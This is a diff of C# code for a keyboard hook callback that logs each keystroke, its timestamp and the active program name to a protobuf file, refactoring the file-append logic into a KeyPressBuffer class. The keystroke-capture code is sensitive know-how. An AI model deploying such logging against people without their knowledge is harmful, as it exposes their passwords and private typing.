@@ -80,28 +80,14 @@ namespace Hooks
                 ks.Key = Marshal.ReadInt32(lParam);
                 ks.Timestamp = x.ToUnixTimeMilliseconds();
                 ks.ActiveProgram = GetActiveWindowName();
-                using (var output = File.Open(log, FileMode.Append))
-                {
-                    // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
-                    // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
-                    //StreamWriter o = new StreamWriter(log+".json");
-                    //o.WriteLine(ks.ToString());
-                    //o.Close();
-
-                    // Weird behavior here. It is not specified in the Proto3 spec anywhere but this is what I found during testing.
-                    // Suppose you have a Top level Container protocol message that has repeated messages as a field. (KeyStrokeBuffer)
-                    // If you have two instances of that Top Level Message and you save both to the same file opened using append,
-                    // then parse the same file starting from the begining you will end up with one of the Top Level Container
-                    // messages which containes the child messages of both orgional Container Messages.
-                    // The code below uses that fact to append one KeyStroke to the KeyStrokeBuffer container in the binary log. This
-                    // is a hack. The proper way to store multiple messages in the same file is to first write the size and parse each
-                    // individual chunck of the buffer individually. See: https://developers.google.com/protocol-buffers/docs/techniques#streaming
-                    // This is easier, and is really fast, so until it blows up I'm going to leave it like this.
-                    KeyPressBuffer b = new KeyPressBuffer();
-                    b.Keys.Add(ks);
-                    b.WriteTo(output);
-                    output.Close();
-                }
+                
+                // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
+                // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
+                //StreamWriter o = new StreamWriter(log+".json");
+                //o.WriteLine(ks.ToString());
+                //o.Close();
+                KeyPressBuffer b = new KeyPressBuffer(log);
+                b.AddKeyPress(ks);
 
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
